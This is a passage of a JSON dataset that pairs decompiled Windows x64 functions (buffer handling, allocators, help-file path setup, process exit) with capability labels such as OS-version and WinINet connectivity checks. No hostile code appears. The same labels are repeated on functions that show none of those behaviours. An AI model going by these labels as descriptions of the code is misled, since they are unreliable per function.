            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.1400173f8(int64_t arg1, ulong arg2)\n\n{\n    int64_t *piVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint64_t arg1_00;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    int64_t iVar6;\n    uint32_t uVar7;\n    uint64_t arg4;\n    \n    if ((*(arg1 + 0x20) & 1) == 0) {\n        fcn.140017da0(4, *(arg1 + 0x18));\n        pcVar2 = swi(3);\n        (*pcVar2)();\n        return;\n    }\n    piVar1 = arg1 + 0x40;\n    uVar4 = *piVar1 - *(arg1 + 0x38);\n    arg4 = uVar4;\n    uVar7 = uVar4 + arg2;\n    if (*(arg1 + 0xc) == 0) {\n        arg1_00 = *(arg1 + 0x48);\n        if (arg1_00 < *(arg1 + 0x38)) {\n            if (0 < uVar4) {\n                iVar3 = fcn.14001afb0(arg1_00, *piVar1 - arg1_00, *(arg1 + 0x38), arg4);\n                if (iVar3 != 0) {\n                    if (iVar3 == 0xc) {\n                        fcn.140005de8();\n                        pcVar2 = swi(3);\n                        (*pcVar2)();\n                        return;\n                    }\n                    if ((iVar3 == 0x16) || (iVar3 == 0x22)) {\n                        fcn.140005e30();\n                        pcVar2 = swi(3);\n                        (*pcVar2)();\n                        return;\n                    }\n                    if (iVar3 != 0x50) {\n                        fcn.140005e30();\n                        pcVar2 = swi(3);\n                        (*pcVar2)();\n                        return;\n                    }\n                }\n                arg1_00 = *(arg1 + 0x48);\n                *(arg1 + 0x38) = arg1_00;\n                *piVar1 = arg4 + arg1_00;\n            }\n            if (*(arg1 + 0x10) == 0) {\n                arg2._0_4_ = *(arg1 + 0x28);\n            }\n            arg2._0_4_ = arg2 - uVar4;\n            iVar6 = arg4 + arg1_00;\n            do {\n                uVar4 = (**(**(arg1 + 0x30) + 0x68))(*(arg1 + 0x30), iVar6, arg2);\n                uVar5 = arg4 + uVar4;\n                arg4 = uVar5;\n                arg2._0_4_ = arg2 - uVar4;\n                iVar6 = iVar6 + uVar4;\n                if ((uVar4 == 0) || (arg2 == 0)) break;\n            } while (uVar5 < uVar7);\n            *(arg1 + 0x38) = *(arg1 + 0x48);\n            *piVar1 = arg4 + *(arg1 + 0x48);\n        }\n    }\n    else {\n        if (uVar4 != 0) {\n            (**(**(arg1 + 0x30) + 0x50))();\n        }\n        (**(**(arg1 + 0x30) + 0xa0))(*(arg1 + 0x30), 0, *(arg1 + 0x28), arg1 + 0x48, piVar1);\n        *(arg1 + 0x38) = *(arg1 + 0x48);\n    }\n    if (*piVar1 - *(arg1 + 0x38) < uVar7) {\n        fcn.140017da0(3, 0);\n        pcVar2 = swi(3);\n        (*pcVar2)();\n        return;\n    }\n    return;\n}\n",
        "token_count": 890
    },
    "1400176c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.1400176c4(int64_t arg1, int64_t arg2, ulong arg3)\n\n{\n    int64_t *piVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint64_t arg4;\n    \n    if ((arg3 != 0) && (arg2 != 0)) {\n        if ((~*(arg1 + 0x20) & 1) == 0) {\n            fcn.140017da0(2, *(arg1 + 0x18));\n            pcVar2 = swi(3);\n            (*pcVar2)();\n            return;\n        }\n        piVar1 = arg1 + 0x40;\n        uVar4 = *piVar1 - *(arg1 + 0x38);\n        arg4 = uVar4;\n        if (arg3 < uVar4) {\n            arg4 = arg3;\n        }\n        iVar3 = fcn.14001af18(*(arg1 + 0x38), *piVar1 - *(arg1 + 0x38), arg2, arg4);\n        if (iVar3 != 0) {\n            if (iVar3 == 0xc) {\n                fcn.140005de8();\n                pcVar2 = swi(3);\n                (*pcVar2)();\n                return;\n            }\n            if ((iVar3 == 0x16) || (iVar3 == 0x22)) {\n                fcn.140005e30();\n                pcVar2 = swi(3);\n                (*pcVar2)();\n                return;\n            }\n            if (iVar3 != 0x50) {\n                fcn.140005e30();\n                pcVar2 = swi(3);\n                (*pcVar2)();\n                return;\n            }\n        }\n        *(arg1 + 0x38) = *(arg1 + 0x38) + arg4;\n        arg3._0_4_ = arg3 - arg4;\n        if (arg3 != 0) {\n            fcn.140017338(arg1);\n            uVar4 = arg3 - arg3 % *(arg1 + 0x28);\n            (**(**(arg1 + 0x30) + 0x70))(*(arg1 + 0x30), arg2 + arg4, uVar4);\n            arg3._0_4_ = arg3 - uVar4;\n            if (*(arg1 + 0xc) != 0) {\n                (**(**(arg1 + 0x30) + 0xa0))(*(arg1 + 0x30), 1, *(arg1 + 0x28), arg1 + 0x48, piVar1);\n                *(arg1 + 0x38) = *(arg1 + 0x48);\n            }\n            if (*(arg1 + 0x28) <= arg3) {\n                fcn.140005e30();\n                pcVar2 = swi(3);\n                (*pcVar2)();\n                return;\n            }\n            if (*(arg1 + 0x38) != *(arg1 + 0x48)) {\n                fcn.140005e30();\n                pcVar2 = swi(3);\n                (*pcVar2)();\n                return;\n            }\n            iVar3 = fcn.14001af18(*(arg1 + 0x38), arg3, arg2 + arg4 + uVar4, arg3);\n            if (iVar3 != 0) {\n                if (iVar3 == 0xc) {\n                    fcn.140005de8();\n                    pcVar2 = swi(3);\n                    (*pcVar2)();\n                    return;\n                }\n                if ((iVar3 == 0x16) || (iVar3 == 0x22)) {\n                    fcn.140005e30();\n                    pcVar2 = swi(3);\n                    (*pcVar2)();\n                    return;\n                }\n                if (iVar3 != 0x50) {\n                    fcn.140005e30();\n                    pcVar2 = swi(3);\n                    (*pcVar2)();\n                    return;\n                }\n            }\n            *(arg1 + 0x38) = *(arg1 + 0x38) + arg3;\n        }\n    }\n    return;\n}\n",
        "token_count": 927
    },
    "140017eb": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nulong * fcn.140017eb4(int64_t arg1)\n\n{\n    ulong uVar1;\n    code *pcVar2;\n    int64_t iVar3;\n    int64_t *piVar4;\n    ulong *puVar5;\n    int64_t iVar6;\n    \n    if (*(arg1 + 0x20) == 0) {\n        iVar3 = fcn.140018cc4(arg1 + 0x28, *(arg1 + 0x30), 0x20);\n        iVar6 = *(arg1 + 0x30);\n        puVar5 = iVar3 + -0x18 + iVar6 * 0x20;\n        while (iVar6 = iVar6 + -1,  -1 < iVar6) {\n            *puVar5 = *(arg1 + 0x20);\n            *(arg1 + 0x20) = puVar5;\n            puVar5 = puVar5 + -4;\n        }\n    }\n    puVar5 = *(arg1 + 0x20);\n    uVar1 = *puVar5;\n    *(arg1 + 0x18) = *(arg1 + 0x18) + 1;\n    *(arg1 + 0x20) = uVar1;\n    if (puVar5 + 2 != NULL) {\n        piVar4 = fcn.14000fd70();\n        if (piVar4 == NULL) {\n            fcn.140001010(0x80004005);\n            pcVar2 = swi(3);\n            puVar5 = (*pcVar2)();\n            return puVar5;\n        }\n        iVar6 = (**(*piVar4 + 0x18))(piVar4);\n        puVar5[2] = iVar6 + 0x18;\n    }\n    puVar5[3] = 0;\n    return puVar5;\n}\n",
        "token_count": 406
    },
    "14001804": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.140018044(int64_t arg1)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    code *pcVar4;\n    int64_t iVar5;\n    uint32_t uVar6;\n    ulong *puVar7;\n    \n    if (*(arg1 + 8) != 0) {\n        uVar6 = 0;\n        if (*(arg1 + 0x10) != 0) {\n            iVar5 = 0;\n            do {\n                for (puVar7 = *(*(arg1 + 8) + iVar5); puVar7 != NULL; puVar7 = *puVar7) {\n                    if (puVar7 + 2 == NULL) {\n                        fcn.140005e30();\n                        pcVar4 = swi(3);\n                        (*pcVar4)();\n                        return;\n                    }\n                    iVar3 = puVar7[2];\n                    LOCK();\n                    piVar1 = iVar3 + -8;\n                    iVar2 = *piVar1;\n                    *piVar1 = *piVar1 + -1;\n                    if (iVar2 + -1 < 1) {\n                        (**(**(iVar3 + -0x18) + 8))();\n                    }\n                }\n                uVar6 = uVar6 + 1;\n                iVar5 = iVar5 + 8;\n            } while (uVar6 < *(arg1 + 0x10));\n        }\n        fcn.1400058b4(*(arg1 + 8));\n        *(arg1 + 8) = 0;\n    }\n    *(arg1 + 0x18) = 0;\n    *(arg1 + 0x20) = 0;\n    fcn.140018cfc(*(arg1 + 0x28));\n    *(arg1 + 0x28) = 0;\n    return;\n}\n",
        "token_count": 409
    },
    "140018d1": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint32_t * fcn.140018d1c(uint32_t *arg1, ulong arg2, ulong arg3)\n\n{\n    if (arg2 < 8) {\n        arg2._0_4_ = 8;\n    }\n    if (arg3 < 2) {\n        arg3._0_4_ = 0x40;\n    }\n    *(arg1 + 4) = 0;\n    *(arg1 + 2) = 0;\n    arg1[1] = arg3;\n    *arg1 = arg2;\n    return arg1;\n}\n",
        "token_count": 127
    },
    "140018d7": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.140018d74(uint32_t *arg1)\n\n{\n    uint32_t uVar1;\n    int64_t iVar2;\n    ulong *puVar3;\n    \n    if (*(arg1 + 4) == 0) {\n        iVar2 = fcn.140018cc4(arg1 + 2, arg1[1], *arg1);\n        uVar1 = arg1[1];\n        puVar3 = iVar2 + 8 + (uVar1 - 1) * *arg1;\n        while (uVar1 = uVar1 - 1,  -1 < uVar1) {\n            *puVar3 = *(arg1 + 4);\n            *(arg1 + 4) = puVar3;\n            puVar3 = puVar3 - *arg1;\n        }\n    }\n    *(arg1 + 4) = **(arg1 + 4);\n    return;\n}\n",
        "token_count": 201
    },
    "14001913": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.140019130(int64_t arg1)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    uchar *arg1_00;\n    int64_t iVar4;\n    uchar *arg1_01;\n    ulong in_R9;\n    uchar auStack856 [32];\n    uchar auStack824 [260];\n    uchar auStack564 [12];\n    uchar auStack552 [272];\n    uchar auStack280 [256];\n    uint64_t uStack24;\n    \n    uStack24 = *0x14003e1a0 ^ auStack856;\n    iVar3 = fcn.140006c48();\n    *(iVar3 + 0x10) = *(arg1 + 0x88);\n    *(iVar3 + 0x18) = *(arg1 + 0x88);\n    iVar2 = (*_sym.imp.KERNEL32.dll_GetModuleFileNameA)(*(arg1 + 0x88), auStack824, 0x104);\n    if ((iVar2 == 0) || (iVar2 == 0x104)) {\n        fcn.140006f0c();\n    }\n    arg1_00 = (*_sym.imp.SHLWAPI.dll_PathFindExtensionA)(auStack824);\n    if (arg1_00 == NULL) {\n        fcn.140006f0c();\n    }\n    *arg1_00 = 0;\n    iVar2 = fcn.1400190b4(auStack824, auStack552, 0x104, in_R9);\n    if (iVar2 != 0) {\n        fcn.140006f0c();\n    }\n    if (*(arg1 + 0xc0) == 0) {\n        iVar4 = fcn.14001ccc4(auStack552);\n        *(arg1 + 0xc0) = iVar4;\n        if (iVar4 == 0) {\n            fcn.140005de8();\n            pcVar1 = swi(3);\n            (*pcVar1)();\n            return;\n        }\n    }\n    iVar4 = *(arg1 + 0xa0);\n    if (iVar4 == 0) {\n        iVar2 = fcn.14000fca0(0xe000, auStack280, 0x100);\n        arg1_01 = auStack280;\n        if (iVar2 == 0) {\n            arg1_01 = *(arg1 + 0xc0);\n        }\n        iVar4 = fcn.14001ccc4(arg1_01);\n        *(arg1 + 0xa0) = iVar4;\n        if (iVar4 == 0) {\n            fcn.140005de8();\n            pcVar1 = swi(3);\n            (*pcVar1)();\n            return;\n        }\n    }\n    *(iVar3 + 0x20) = iVar4;\n    if (*(arg1 + 200) == 0) {\n        if (*(arg1 + 0xd8) == 1) {\n            iVar2 = fcn.14001cbc4(arg1_00, auStack564 + -arg1_00, \".CHM\");\n            if (iVar2 != 0) {\n                if (iVar2 == 0xc) {\n                    fcn.140005de8();\n                    pcVar1 = swi(3);\n                    (*pcVar1)();\n                    return;\n                }\n                if ((iVar2 == 0x16) || (iVar2 == 0x22)) {\n                    fcn.140005e30();\n                    pcVar1 = swi(3);\n                    (*pcVar1)();\n                    return;\n                }\n                if (iVar2 != 0x50) {\n                    fcn.140005e30();\n                    pcVar1 = swi(3);\n                    (*pcVar1)();\n                    return;\n                }\n            }\n        }\n        else {\n            iVar2 = fcn.14001cbc4(arg1_00, auStack564 + -arg1_00, \".HLP\");\n            if (iVar2 != 0) {\n                if (iVar2 == 0xc) {\n                    fcn.140005de8();\n                    pcVar1 = swi(3);\n                    (*pcVar1)();\n                    return;\n                }\n                if ((iVar2 == 0x16) || (iVar2 == 0x22)) {\n                    fcn.140005e30();\n                    pcVar1 = swi(3);\n                    (*pcVar1)();\n                    return;\n                }\n                if (iVar2 != 0x50) {\n                    fcn.140005e30();\n                    pcVar1 = swi(3);\n                    (*pcVar1)();\n                    return;\n                }\n            }\n        }\n        iVar3 = fcn.14001ccc4(auStack824);\n        *(arg1 + 200) = iVar3;\n        if (iVar3 == 0) {\n            fcn.140005de8();\n            pcVar1 = swi(3);\n            (*pcVar1)();\n            return;\n        }\n        *arg1_00 = 0;\n    }\n    if (*(arg1 + 0xd0) == 0) {\n        iVar2 = fcn.14001cc38(auStack552, 0x104, \".INI\");\n        if (iVar2 != 0) {\n            if (iVar2 == 0xc) {\n                fcn.140005de8();\n                pcVar1 = swi(3);\n                (*pcVar1)();\n                return;\n            }\n            if ((iVar2 == 0x16) || (iVar2 == 0x22)) {\n                fcn.140005e30();\n                pcVar1 = swi(3);\n                (*pcVar1)();\n                return;\n            }\n            if (iVar2 != 0x50) {\n                fcn.140005e30();\n                pcVar1 = swi(3);\n                (*pcVar1)();\n                return;\n            }\n        }\n        iVar3 = fcn.14001ccc4(auStack552);\n        *(arg1 + 0xd0) = iVar3;\n        if (iVar3 == 0) {\n            fcn.140005de8();\n            pcVar1 = swi(3);\n            (*pcVar1)();\n            return;\n        }\n    }\n    fcn.14001b410(uStack24 ^ auStack856);\n    return;\n}\n",
        "token_count": 1371
    },
    "14001939": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nulong fcn.140019398(ulong arg1, ulong noname_1, ulong arg3, ulong arg4)\n\n{\n    uint32_t uVar1;\n    int64_t iVar2;\n    \n    uVar1 = (*_sym.imp.KERNEL32.dll_SetErrorMode)(0);\n    (*_sym.imp.KERNEL32.dll_SetErrorMode)(uVar1 | 0x8001);\n    iVar2 = fcn.140006c48();\n    *(iVar2 + 0x10) = arg1;\n    *(iVar2 + 0x18) = arg1;\n    fcn.140006054(iVar2);\n    iVar2 = fcn.140006c48();\n    iVar2 = *(iVar2 + 8);\n    if (iVar2 != 0) {\n        *(iVar2 + 0x88) = arg1;\n        *(iVar2 + 0x90) = arg3;\n        *(iVar2 + 0x98) = arg4;\n        fcn.140019130(iVar2);\n    }\n    iVar2 = fcn.140006c48();\n    if (*(iVar2 + 0x28) == '\\0') {\n        fcn.140012f50();\n    }\n    iVar2 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(\"user32.dll\");\n    if (iVar2 != 0) {\n        *0x140052ff0 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar2, \"NotifyWinEvent\");\n    }\n    return 1;\n}\n",
        "token_count": 331
    },
    "140019d4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint64_t fcn.140019d48(int64_t arg1, int64_t arg2, uint32_t *arg3, uint32_t *arg4)\n\n{\n    uint16_t uVar1;\n    uint16_t *puVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    int64_t iVar5;\n    uint64_t uVar6;\n    uint64_t *puVar7;\n    uint32_t uVar8;\n    uint32_t uVar9;\n    uint32_t auStackX8 [2];\n    ulong uStack56;\n    int64_t iStack48;\n    \n    if ((*(arg1 + 0x20) & 1) == 0) {\n        fcn.140017da0(1, *(arg1 + 0x18));\n        pcVar3 = swi(3);\n        iVar5 = (*pcVar3)();\n        return iVar5;\n    }\n    if ((arg2 != 0) && (*(arg2 + 0xc) == 0xffff)) {\n        fcn.140005e0c();\n        pcVar3 = swi(3);\n        iVar5 = (*pcVar3)();\n        return iVar5;\n    }\n    fcn.140019a0c(arg1, 0);\n    if ((*(arg1 + 0x20) & 1) == 0) {\n        fcn.140017da0(4, *(arg1 + 0x18));\n        pcVar3 = swi(3);\n        iVar5 = (*pcVar3)();\n        return iVar5;\n    }\n    uVar6 = *(arg1 + 0x38) + 2;\n    if (*(arg1 + 0x40) <= uVar6 && uVar6 != *(arg1 + 0x40)) {\n        fcn.1400173f8(arg1, (*(arg1 + 0x38) - *(arg1 + 0x40)) + 2);\n    }\n    puVar2 = *(arg1 + 0x38);\n    uVar1 = *puVar2;\n    *(arg1 + 0x38) = puVar2 + 1;\n    if (uVar1 == 0x7fff) {\n        if ((*(arg1 + 0x20) & 1) == 0) {\n            fcn.140017da0(4, *(arg1 + 0x18));\n            pcVar3 = swi(3);\n            iVar5 = (*pcVar3)();\n            return iVar5;\n        }\n        if (*(arg1 + 0x40) <= puVar2 + 3 && puVar2 + 3 != *(arg1 + 0x40)) {\n            fcn.1400173f8(arg1, (*(arg1 + 0x38) - *(arg1 + 0x40)) + 4);\n        }\n        uVar9 = **(arg1 + 0x38);\n        *(arg1 + 0x38) = *(arg1 + 0x38) + 1;\n    }\n    else {\n        uVar9 = (uVar1 & 0x8000) << 0x10 | uVar1 & 0xffff7fff;\n    }\n    if (uVar9 < 0) {\n        if (uVar1 == 0xffff) {\n            iVar5 = fcn.1400175c0(arg1, auStackX8);\n            if (iVar5 == 0) {\n                fcn.140017da0(6, *(arg1 + 0x18));\n                pcVar3 = swi(3);\n                iVar5 = (*pcVar3)();\n                return iVar5;\n            }\n            if ((*(iVar5 + 0xc) & 0x7fffffff) != auStackX8[0]) {\n                if (-1 < *(iVar5 + 0xc)) {\n                    fcn.140017da0(7, *(arg1 + 0x18));\n                    pcVar3 = swi(3);\n                    iVar5 = (*pcVar3)();\n                    return iVar5;\n                }\n                fcn.1400198f0(arg1, 0);\n                uVar6 = auStackX8[0];\n                puVar7 = fcn.140015b8c(*(arg1 + 0x60), iVar5);\n                *puVar7 = uVar6;\n            }\n            fcn.140019450(arg1);\n            fcn.14001a718(*(arg1 + 0x58), *(arg1 + 0x50), iVar5, 1);\n            iStack48 = 0;\n            fcn.14001598c(*(arg1 + 0x60), 1, &iStack48);\n            if (iStack48 == 0) {\n                fcn.140005e30();\n                pcVar3 = swi(3);\n                iVar5 = (*pcVar3)();\n                return iVar5;\n            }\n            uStack56 = CONCAT44(uStack56._4_4_, 1);\n            fcn.1400196a0(iStack48, *(arg1 + 0x50), &uStack56, 1);\n            *(arg1 + 0x50) = *(arg1 + 0x50) + 1;\n        }\n        else {\n            uVar8 = uVar9 & 0x7fffffff;\n            if ((uVar8 == 0) || (*(*(arg1 + 0x58) + 0x10) - 1U < uVar8)) {\n                fcn.140017da0(5, *(arg1 + 0x18));\n                pcVar3 = swi(3);\n                iVar5 = (*pcVar3)();\n                return iVar5;\n            }\n            uStack56 = 0;\n            fcn.14001598c(*(arg1 + 0x60), 1, &uStack56);\n            if (uStack56 == 0) {\n                fcn.140005e30();\n                pcVar3 = swi(3);\n                iVar5 = (*pcVar3)();\n                return iVar5;\n            }\n            if (*(uStack56 + 0x10) <= uVar8) {\n                fcn.140005e30();\n                pcVar3 = swi(3);\n                iVar5 = (*pcVar3)();\n                return iVar5;\n            }\n            if (*(*(uStack56 + 8) + uVar8 * 4) == 2) {\n                fcn.140017da0(5, *(arg1 + 0x18));\n                pcVar3 = swi(3);\n                iVar5 = (*pcVar3)();\n                return iVar5;\n            }\n            if (*(*(arg1 + 0x58) + 0x10) <= uVar8) {\n                fcn.140005e30();\n                pcVar3 = swi(3);\n                iVar5 = (*pcVar3)();\n                return iVar5;\n            }\n            iVar5 = *(*(*(arg1 + 0x58) + 8) + uVar8 * 8);\n            auStackX8[0] = 0;\n            if ((*(arg1 + 0x60) == 0) || (iVar4 = fcn.14001598c(*(arg1 + 0x60), iVar5, &uStack56),  iVar4 == 0)) {\n                auStackX8[0] = *(iVar5 + 0xc) & 0x7fffffff;\n            }\n            else {\n                auStackX8[0] = uStack56;\n            }\n        }\n        if ((arg2 != 0) && (iVar4 = fcn.140014a64(iVar5, arg2),  iVar4 == 0)) {\n            fcn.140017da0(6, *(arg1 + 0x18));\n            pcVar3 = swi(3);\n            iVar5 = (*pcVar3)();\n            return iVar5;\n        }\n        if (arg3 == NULL) {\n            *(arg1 + 0x14) = auStackX8[0];\n        }\n        else {\n            *arg3 = auStackX8[0];\n        }\n        if (arg4 != NULL) {\n            *arg4 = uVar9;\n        }\n    }\n    else {\n        if (arg4 == NULL) {\n            fcn.140017da0(5, *(arg1 + 0x18));\n            pcVar3 = swi(3);\n            iVar5 = (*pcVar3)();\n            return iVar5;\n        }\n        *arg4 = uVar9;\n        iVar5 = 0;\n    }\n    return iVar5;\n}\n",
        "token_count": 1889
    },
    "14001cb2": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00014001cad5)\n// WARNING: Removing unreachable block (ram,0x00014001cb0a)\n\nvoid fcn.14001cb24(ulong arg1)\n\n{\n    int64_t *piVar1;\n    int64_t *piVar2;\n    int64_t iVar3;\n    code *pcVar4;\n    int64_t *piVar5;\n    int64_t *piVar6;\n    int64_t *piVar7;\n    int64_t *piVar8;\n    \n    fcn.140023ba4(8);\n    if (*0x140053820 != 1) {\n        *0x14005381c = 1;\n        *0x140053818 = 0;\n        piVar1 = sub.KERNEL32.dll_DecodePointer(*0x140055930);\n        if (piVar1 != NULL) {\n            piVar2 = sub.KERNEL32.dll_DecodePointer(*0x140055928);\n            piVar7 = piVar2;\n            piVar8 = piVar1;\ncode_r0x00014001ca2e:\n            piVar2 = piVar2 + -1;\n            if (piVar1 <= piVar2) goto code_r0x00014001ca3c;\n            goto code_r0x00014001ca48;\n        }\ncode_r0x00014001caa9:\n        fcn.14001c878(0x14002da78, 0x14002da90);\n        fcn.14001c878(0x14002da98, 0x14002daa0);\n    }\n    *0x140053820 = 1;\n    fcn.140023aa4(8);\n    fcn.14001c80c(arg1);\n    (*_sym.imp.KERNEL32.dll_ExitProcess)(arg1);\n    pcVar4 = swi(3);\n    (*pcVar4)();\n    return;\ncode_r0x00014001ca3c:\n    iVar3 = fcn.14001d3f8();\n    if (*piVar2 != iVar3) {\ncode_r0x00014001ca48:\n        if (piVar1 <= piVar2) {\n            pcVar4 = sub.KERNEL32.dll_DecodePointer(*piVar2);\n            iVar3 = fcn.14001d3f8();\n            *piVar2 = iVar3;\n            (*pcVar4)();\n            piVar5 = sub.KERNEL32.dll_DecodePointer(*0x140055930);\n            piVar6 = sub.KERNEL32.dll_DecodePointer(*0x140055928);\n            if ((piVar8 != piVar5) || (piVar7 != piVar6)) {\n                piVar1 = piVar5;\n                piVar2 = piVar6;\n                piVar7 = piVar6;\n                piVar8 = piVar5;\n            }\n            goto code_r0x00014001ca2e;\n        }\n        goto code_r0x00014001caa9;\n    }\n    goto code_r0x00014001ca2e;\n}\n",
        "token_count": 672
    },
    "14002578": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.140025784(ulong arg1, ulong arg2, ulong arg3)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uchar auStack136 [32];\n    uint uStack104;\n    uint uStack96;\n    uint uStack88;\n    uchar *puStack80;\n    uchar auStack72 [16];\n    int64_t iStack56;\n    char cStack48;\n    uchar auStack40 [8];\n    uchar auStack32 [16];\n    uint64_t uStack16;\n    \n    uStack16 = *0x14003e1a0 ^ auStack136;\n    fcn.14001be3c(auStack72, arg3);\n    puStack80 = auStack72;\n    uStack88 = 0;\n    uStack96 = 0;\n    uStack104 = 0;\n    uVar1 = fcn.140028334(auStack32, auStack40, arg2, 0);\n    iVar2 = fcn.14002772c(auStack32, arg1);\n    if ((uVar1 & 3) == 0) {\n        if (iVar2 == 1) {\n            if (cStack48 != '\\0') {\n                *(iStack56 + 200) = *(iStack56 + 200) & 0xfffffffd;\n            }\n            goto code_r0x000140025868;\n        }\n        if (iVar2 != 2) goto code_r0x000140025853;\n    }\n    else if ((uVar1 & 1) == 0) {\n        if ((uVar1 & 2) != 0) {\n            if (cStack48 != '\\0') {\n                *(iStack56 + 200) = *(iStack56 + 200) & 0xfffffffd;\n            }\n            goto code_r0x000140025868;\n        }\ncode_r0x000140025853:\n        if (cStack48 != '\\0') {\n            *(iStack56 + 200) = *(iStack56 + 200) & 0xfffffffd;\n        }\n        goto code_r0x000140025868;\n    }\n    if (cStack48 != '\\0') {\n        *(iStack56 + 200) = *(iStack56 + 200) & 0xfffffffd;\n    }\ncode_r0x000140025868:\n    fcn.14001b410(uStack16 ^ auStack136);\n    return;\n}\n",
        "token_count": 533
    },
    "14002588": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.140025888(ulong arg1, ulong arg2, ulong arg3)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uchar auStack136 [32];\n    uint uStack104;\n    uint uStack96;\n    uint uStack88;\n    uchar *puStack80;\n    uchar auStack72 [16];\n    int64_t iStack56;\n    char cStack48;\n    uchar auStack40 [8];\n    uchar auStack32 [16];\n    uint64_t uStack16;\n    \n    uStack16 = *0x14003e1a0 ^ auStack136;\n    fcn.14001be3c(auStack72, arg3);\n    puStack80 = auStack72;\n    uStack88 = 0;\n    uStack96 = 0;\n    uStack104 = 0;\n    uVar1 = fcn.140028334(auStack32, auStack40, arg2, 0);\n    iVar2 = fcn.140027d30(auStack32, arg1);\n    if ((uVar1 & 3) == 0) {\n        if (iVar2 == 1) {\n            if (cStack48 != '\\0') {\n                *(iStack56 + 200) = *(iStack56 + 200) & 0xfffffffd;\n            }\n            goto code_r0x00014002596c;\n        }\n        if (iVar2 != 2) goto code_r0x000140025957;\n    }\n    else if ((uVar1 & 1) == 0) {\n        if ((uVar1 & 2) != 0) {\n            if (cStack48 != '\\0') {\n                *(iStack56 + 200) = *(iStack56 + 200) & 0xfffffffd;\n            }\n            goto code_r0x00014002596c;\n        }\ncode_r0x000140025957:\n        if (cStack48 != '\\0') {\n            *(iStack56 + 200) = *(iStack56 + 200) & 0xfffffffd;\n        }\n        goto code_r0x00014002596c;\n    }\n    if (cStack48 != '\\0') {\n        *(iStack56 + 200) = *(iStack56 + 200) & 0xfffffffd;\n    }\ncode_r0x00014002596c:\n    fcn.14001b410(uStack16 ^ auStack136);\n    return;\n}\n",
        "token_count": 537
    },
    "14002642": {
        "rules": [
